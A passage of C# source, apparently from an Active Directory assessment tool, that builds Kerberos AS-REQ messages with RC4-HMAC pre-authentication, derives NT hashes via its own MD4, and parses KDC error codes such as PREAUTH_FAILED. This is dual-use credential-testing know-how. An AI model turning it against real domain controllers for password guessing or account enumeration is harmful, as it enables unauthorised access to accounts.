                        stream.Write(data, 0, data.Length);
                        stream.Flush();

                        // Read response length
                        byte[] respLenBytes = new byte[4];
                        int read = stream.Read(respLenBytes, 0, 4);
                        if (read < 4) return null;

                        int respLen = IPAddress.NetworkToHostOrder(BitConverter.ToInt32(respLenBytes, 0));
                        if (respLen <= 0 || respLen > 65535) return null;

                        // Read response
                        byte[] response = new byte[respLen];
                        int totalRead = 0;
                        while (totalRead < respLen)
                        {
                            read = stream.Read(response, totalRead, respLen - totalRead);
                            if (read <= 0) break;
                            totalRead += read;
                        }

                        return response;
                    }
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"    [!] KDC connection error: {ex.Message}");
                return null;
            }
        }

        private static byte[] DeriveRC4Key(string password)
        {
            // NT hash = MD4(UTF-16LE(password))
            byte[] passwordBytes = Encoding.Unicode.GetBytes(password);
            return ComputeMD4(passwordBytes);
        }

        private static byte[] RC4Encrypt(byte[] key, byte[] data, int keyUsage)
        {
            byte[] confounder = new byte[8];
            new Random().NextBytes(confounder);

            byte[] keyUsageBytes = BitConverter.GetBytes(keyUsage);
            byte[] k1;
            using (var hmac = new HMACMD5(key))
            {
                k1 = hmac.ComputeHash(keyUsageBytes);
            }

            byte[] plaintext = new byte[confounder.Length + data.Length];
            Array.Copy(confounder, 0, plaintext, 0, confounder.Length);
            Array.Copy(data, 0, plaintext, confounder.Length, data.Length);

            byte[] checksum;
            using (var hmac = new HMACMD5(k1))
            {
                checksum = hmac.ComputeHash(plaintext);
            }

            byte[] k2;
            using (var hmac = new HMACMD5(k1))
            {
                k2 = hmac.ComputeHash(checksum);
            }

            byte[] ciphertext = RC4(k2, plaintext);

            byte[] result = new byte[checksum.Length + ciphertext.Length];
            Array.Copy(checksum, 0, result, 0, checksum.Length);
            Array.Copy(ciphertext, 0, result, checksum.Length, ciphertext.Length);

            return result;
        }

        private static byte[] RC4Decrypt(byte[] key, byte[] data, int keyUsage)
        {
            if (data.Length < 24) return null;

            byte[] keyUsageBytes = BitConverter.GetBytes(keyUsage);
            byte[] k1;
            using (var hmac = new HMACMD5(key))
            {
                k1 = hmac.ComputeHash(keyUsageBytes);
            }

            byte[] checksum = new byte[16];
            Array.Copy(data, 0, checksum, 0, 16);

            byte[] ciphertext = new byte[data.Length - 16];
            Array.Copy(data, 16, ciphertext, 0, ciphertext.Length);

            byte[] k2;
            using (var hmac = new HMACMD5(k1))
            {
                k2 = hmac.ComputeHash(checksum);
            }

            byte[] plaintext = RC4(k2, ciphertext);

            // Skip confounder (first 8 bytes)
            byte[] result = new byte[plaintext.Length - 8];
            Array.Copy(plaintext, 8, result, 0, result.Length);

            return result;
        }

        private static byte[] RC4(byte[] key, byte[] data)
        {
            byte[] s = new byte[256];
            byte[] result = new byte[data.Length];

            for (int i = 0; i < 256; i++) s[i] = (byte)i;
            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) & 255;
                byte temp = s[i]; s[i] = s[j]; s[j] = temp;
            }

            int x = 0, y = 0;
            for (int i = 0; i < data.Length; i++)
            {
                x = (x + 1) & 255;
                y = (y + s[x]) & 255;
                byte temp = s[x]; s[x] = s[y]; s[y] = temp;
                result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) & 255]);
            }

            return result;
        }

        #endregion

        #region ASN.1 Helpers

        private static byte[] BuildContextTag(int tag, byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add((byte)(0xA0 + tag));
            result.AddRange(BuildLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildSequence(byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add(0x30);
            result.AddRange(BuildLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildInteger(int value)
        {
            List<byte> result = new List<byte>();
            result.Add(0x02);

            if (value == 0)
            {
                result.Add(0x01);
                result.Add(0x00);
            }
            else if (value > 0 && value <= 127)
            {
                result.Add(0x01);
                result.Add((byte)value);
            }
            else
            {
                byte[] bytes = BitConverter.GetBytes(value);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(bytes);

                int start = 0;
                while (start < bytes.Length - 1 && bytes[start] == 0 && (bytes[start + 1] & 0x80) == 0)
                    start++;

                int len = bytes.Length - start;
                result.Add((byte)len);
                for (int i = start; i < bytes.Length; i++)
                    result.Add(bytes[i]);
            }

            return result.ToArray();
        }

        private static byte[] BuildOctetString(byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add(0x04);
            result.AddRange(BuildLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildGeneralString(string value)
        {
            List<byte> result = new List<byte>();
            result.Add(0x1B);
            byte[] bytes = Encoding.ASCII.GetBytes(value);
            result.AddRange(BuildLength(bytes.Length));
            result.AddRange(bytes);
            return result.ToArray();
        }

        private static byte[] BuildLength(int length)
        {
            if (length < 128)
            {
                return new byte[] { (byte)length };
            }
            else if (length < 256)
            {
                return new byte[] { 0x81, (byte)length };
            }
            else
            {
                return new byte[] { 0x82, (byte)(length >> 8), (byte)(length & 0xFF) };
            }
        }

        private static byte[] BuildPrincipalName(int nameType, params string[] names)
        {
            List<byte> principal = new List<byte>();
            principal.AddRange(BuildContextTag(0, BuildInteger(nameType)));

            List<byte> nameSeq = new List<byte>();
            foreach (string name in names)
            {
                nameSeq.AddRange(BuildGeneralString(name));
            }
            principal.AddRange(BuildContextTag(1, BuildSequence(nameSeq.ToArray())));

            return BuildSequence(principal.ToArray());
        }

        private static byte[] BuildPaEncTimestamp(DateTime time)
        {
            List<byte> paEncTs = new List<byte>();

            string timeStr = time.ToString("yyyyMMddHHmmss") + "Z";
            byte[] timeBytes = Encoding.ASCII.GetBytes(timeStr);

            List<byte> genTime = new List<byte>();
            genTime.Add(0x18);
            genTime.Add((byte)timeBytes.Length);
            genTime.AddRange(timeBytes);

            paEncTs.AddRange(BuildContextTag(0, genTime.ToArray()));

            return BuildSequence(paEncTs.ToArray());
        }

        private static byte[] BuildPaData(int paDataType, byte[] paDataValue, int etype)
        {
            List<byte> padata = new List<byte>();
            padata.AddRange(BuildContextTag(1, BuildInteger(paDataType)));

            if (paDataType == 2) // PA-ENC-TIMESTAMP
            {
                List<byte> encData = new List<byte>();
                encData.AddRange(BuildContextTag(0, BuildInteger(etype)));
                encData.AddRange(BuildContextTag(2, BuildOctetString(paDataValue)));
                padata.AddRange(BuildContextTag(2, BuildOctetString(BuildSequence(encData.ToArray()))));
            }
            else
            {
                padata.AddRange(BuildContextTag(2, BuildOctetString(paDataValue)));
            }

            return BuildSequence(padata.ToArray());
        }

        private static byte[] BuildPaPacRequest(bool includePac)
        {
            List<byte> pacReq = new List<byte>();
            byte[] boolVal = new byte[] { 0x01, 0x01, (byte)(includePac ? 0xFF : 0x00) };
            pacReq.AddRange(BuildContextTag(0, boolVal));

            byte[] pacReqSeq = BuildSequence(pacReq.ToArray());

            // PA-PAC-REQUEST = 128
            List<byte> padata = new List<byte>();
            padata.AddRange(BuildContextTag(1, BuildInteger(128)));
            padata.AddRange(BuildContextTag(2, BuildOctetString(pacReqSeq)));

            return BuildSequence(padata.ToArray());
        }

        private static byte[] BuildKdcReqBody(string realm, string username, string service, string serviceRealm)
        {
            List<byte> body = new List<byte>();

            // kdc-options [0]
            byte[] kdcOptions = new byte[] { 0x03, 0x05, 0x00, 0x50, 0x80, 0x00, 0x00 };
            body.AddRange(BuildContextTag(0, kdcOptions));

            // cname [1]
            body.AddRange(BuildContextTag(1, BuildPrincipalName(1, username)));

            // realm [2]
            body.AddRange(BuildContextTag(2, BuildGeneralString(realm)));

            // sname [3]
            body.AddRange(BuildContextTag(3, BuildPrincipalName(2, service, serviceRealm)));

            // till [5]
            string tillTime = DateTime.UtcNow.AddYears(10).ToString("yyyyMMddHHmmss") + "Z";
            byte[] tillBytes = Encoding.ASCII.GetBytes(tillTime);
            List<byte> tillGenTime = new List<byte>();
            tillGenTime.Add(0x18);
            tillGenTime.Add((byte)tillBytes.Length);
            tillGenTime.AddRange(tillBytes);
            body.AddRange(BuildContextTag(5, tillGenTime.ToArray()));

            // nonce [7]
            Random rnd = new Random();
            body.AddRange(BuildContextTag(7, BuildInteger(rnd.Next())));

            // etype [8]
            List<byte> etypes = new List<byte>();
            etypes.AddRange(BuildInteger(23));
            etypes.AddRange(BuildInteger(18));
            etypes.AddRange(BuildInteger(17));
            body.AddRange(BuildContextTag(8, BuildSequence(etypes.ToArray())));

            return BuildSequence(body.ToArray());
        }

        private static int FindTag(byte[] data, byte tag, int startPos)
        {
            for (int i = startPos; i < data.Length; i++)
            {
                if (data[i] == tag)
                    return i;
            }
            return -1;
        }

        private static int ParseLength(byte[] data, int pos, out int dataStart)
        {
            if (pos >= data.Length)
            {
                dataStart = pos;
                return 0;
            }

            if ((data[pos] & 0x80) == 0)
            {
                dataStart = pos + 1;
                return data[pos];
            }
            else
            {
                int numBytes = data[pos] & 0x7F;
                if (numBytes == 1)
                {
                    dataStart = pos + 2;
                    return data[pos + 1];
                }
                else if (numBytes == 2)
                {
                    dataStart = pos + 3;
                    return (data[pos + 1] << 8) | data[pos + 2];
                }
                else
                {
                    dataStart = pos + numBytes + 1;
                    int len = 0;
                    for (int i = 0; i < numBytes; i++)
                    {
                        len = (len << 8) | data[pos + 1 + i];
                    }
                    return len;
                }
            }
        }

        private static int ParseKrbErrorCode(byte[] data)
        {
            for (int i = 0; i < data.Length - 5; i++)
            {
                if (data[i] == 0xA6 && data[i + 1] == 0x03 && data[i + 2] == 0x02 && data[i + 3] == 0x01)
                {
                    return data[i + 4];
                }
            }
            return -1;
        }

        private static string GetKrbErrorMessage(int errorCode)
        {
            return errorCode switch
            {
                6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN",
                7 => "KDC_ERR_S_PRINCIPAL_UNKNOWN",
                18 => "KDC_ERR_CLIENT_REVOKED",
                23 => "KDC_ERR_KEY_EXPIRED",
                24 => "KDC_ERR_PREAUTH_FAILED",
                25 => "KDC_ERR_PREAUTH_REQUIRED",
                31 => "KRB_AP_ERR_INAPP_CKSUM (bad authenticator checksum)",
                37 => "KDC_ERR_CLIENT_NOT_TRUSTED",
                60 => "KRB_ERR_GENERIC",
                68 => "KDC_ERR_WRONG_REALM",
                _ => $"Error {errorCode}"
            };
        }

        private static string ParseKrbErrorText(byte[] data)
        {
            try
            {
                // Look for e-text [11] in KRB-ERROR
                int eTextPos = FindTag(data, 0xAB, 0); // [11] = 0xAB
                if (eTextPos == -1) return null;

                int eTextLen = ParseLength(data, eTextPos + 1, out int eTextStart);

                // Skip GeneralString tag if present
                if (eTextStart < data.Length && data[eTextStart] == 0x1B)
                {
                    eTextLen = ParseLength(data, eTextStart + 1, out eTextStart);
                }

                if (eTextStart + eTextLen <= data.Length)
                {
                    return Encoding.ASCII.GetString(data, eTextStart, eTextLen);
                }
            }
            catch { }
            return null;
        }

        #endregion

        #region MD4 Implementation

        private static byte[] ComputeMD4(byte[] input)
        {
            uint[] state = new uint[4] { 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476 };

            byte[] paddedInput = PadMessage(input);

            for (int i = 0; i < paddedInput.Length / 64; i++)
            {
                uint[] block = new uint[16];
                for (int j = 0; j < 16; j++)
                {
                    block[j] = BitConverter.ToUInt32(paddedInput, i * 64 + j * 4);
                }
                MD4Transform(state, block);
            }

            byte[] result = new byte[16];
            Buffer.BlockCopy(state, 0, result, 0, 16);
            return result;
        }

        private static byte[] PadMessage(byte[] input)
        {
            long originalLength = input.Length;
            long paddedLength = ((originalLength + 8) / 64 + 1) * 64;

            byte[] padded = new byte[paddedLength];
            Array.Copy(input, padded, originalLength);
            padded[originalLength] = 0x80;

            long bitLength = originalLength * 8;
            byte[] lengthBytes = BitConverter.GetBytes(bitLength);
            Array.Copy(lengthBytes, 0, padded, (int)paddedLength - 8, 8);

            return padded;
        }

        private static void MD4Transform(uint[] state, uint[] block)
        {
            uint a = state[0], b = state[1], c = state[2], d = state[3];

            a = FF(a, b, c, d, block[0], 3); d = FF(d, a, b, c, block[1], 7);
            c = FF(c, d, a, b, block[2], 11); b = FF(b, c, d, a, block[3], 19);
            a = FF(a, b, c, d, block[4], 3); d = FF(d, a, b, c, block[5], 7);
            c = FF(c, d, a, b, block[6], 11); b = FF(b, c, d, a, block[7], 19);
            a = FF(a, b, c, d, block[8], 3); d = FF(d, a, b, c, block[9], 7);
            c = FF(c, d, a, b, block[10], 11); b = FF(b, c, d, a, block[11], 19);
            a = FF(a, b, c, d, block[12], 3); d = FF(d, a, b, c, block[13], 7);
            c = FF(c, d, a, b, block[14], 11); b = FF(b, c, d, a, block[15], 19);

            a = GG(a, b, c, d, block[0], 3); d = GG(d, a, b, c, block[4], 5);
            c = GG(c, d, a, b, block[8], 9); b = GG(b, c, d, a, block[12], 13);
            a = GG(a, b, c, d, block[1], 3); d = GG(d, a, b, c, block[5], 5);
            c = GG(c, d, a, b, block[9], 9); b = GG(b, c, d, a, block[13], 13);
            a = GG(a, b, c, d, block[2], 3); d = GG(d, a, b, c, block[6], 5);
            c = GG(c, d, a, b, block[10], 9); b = GG(b, c, d, a, block[14], 13);
            a = GG(a, b, c, d, block[3], 3); d = GG(d, a, b, c, block[7], 5);
            c = GG(c, d, a, b, block[11], 9); b = GG(b, c, d, a, block[15], 13);

            a = HH(a, b, c, d, block[0], 3); d = HH(d, a, b, c, block[8], 9);
            c = HH(c, d, a, b, block[4], 11); b = HH(b, c, d, a, block[12], 15);
            a = HH(a, b, c, d, block[2], 3); d = HH(d, a, b, c, block[10], 9);
            c = HH(c, d, a, b, block[6], 11); b = HH(b, c, d, a, block[14], 15);
            a = HH(a, b, c, d, block[1], 3); d = HH(d, a, b, c, block[9], 9);
            c = HH(c, d, a, b, block[5], 11); b = HH(b, c, d, a, block[13], 15);
            a = HH(a, b, c, d, block[3], 3); d = HH(d, a, b, c, block[11], 9);
            c = HH(c, d, a, b, block[7], 11); b = HH(b, c, d, a, block[15], 15);

            state[0] += a; state[1] += b; state[2] += c; state[3] += d;
        }

        private static uint FF(uint a, uint b, uint c, uint d, uint x, int s) => ROL(a + ((b & c) | (~b & d)) + x, s);
        private static uint GG(uint a, uint b, uint c, uint d, uint x, int s) => ROL(a + ((b & c) | (b & d) | (c & d)) + x + 0x5a827999, s);
        private static uint HH(uint a, uint b, uint c, uint d, uint x, int s) => ROL(a + (b ^ c ^ d) + x + 0x6ed9eba1, s);
        private static uint ROL(uint value, int shift) => (value << shift) | (value >> (32 - shift));

        #endregion
    }
}
